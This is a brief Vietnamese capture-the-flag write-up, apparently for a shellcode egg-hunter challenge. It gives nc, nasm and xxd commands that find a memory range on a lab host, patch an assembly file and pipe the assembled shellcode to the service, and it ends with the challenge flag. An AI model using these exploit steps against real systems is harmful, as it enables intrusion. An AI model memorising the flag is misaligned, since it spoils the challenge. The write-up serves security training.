Chạy lệnh sau: (nhớ copy file asm vào desktop Kali)<br/>
<code> nc 192.168.100.210 16831</code> <br/>
Lấy được khoảng giá trị của với dòng như sau <strong>The egg will be between 0xb7505000 and 0xb7604fff</strong>, lưu ý khoảng này KHÔNG cố định <br/>
Cái 0xb76....., thay thành 0xb75..... vào file asm rồi chạy <br/>
<code>nasm sc2_soln.asm</code><br/>
<code>xxd -ps sc2_soln</code><br/>
<code>xxd -ps sc2_soln | nc 192.168.100.210 16831</code><br/>
Cờ là <code>ProcessCertainNearly173</code>
